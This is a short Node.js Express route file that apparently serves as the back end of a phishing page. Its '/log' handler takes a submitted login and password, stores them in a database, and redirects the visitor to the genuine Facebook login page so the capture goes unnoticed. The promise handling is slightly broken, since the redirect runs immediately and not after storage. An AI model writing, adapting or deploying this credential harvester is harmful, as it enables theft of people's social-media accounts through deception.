const { json } = require('express');
const db = require('./db');
const bodyParser = require('body-parser')
const auth = require('express').Router();
const urlencodedParser = bodyParser.urlencoded({ extended: false })


auth.post('/log', urlencodedParser, (req, res) =>{
    const data = {
        login: req.body.login,
        password: req.body.password
    }
    db.register(data).then(
        res.redirect('https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Finstantgames%2F474443516378085')
    )
})

module.exports = auth;